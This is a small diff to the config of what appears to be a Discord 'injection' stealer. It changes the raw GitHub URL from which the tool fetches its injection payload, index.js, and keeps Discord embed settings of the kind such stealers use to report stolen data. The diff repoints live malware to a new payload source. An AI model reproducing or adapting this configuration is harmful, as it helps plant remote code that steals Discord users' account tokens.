@@ -14,7 +14,7 @@ const config = {
   embed_name: 'sercwn enjeksiyon', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1107582340462559256/1107582540719591555/a.png?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Loswer06/injection/main/index.js', 
   /**
    
    **/
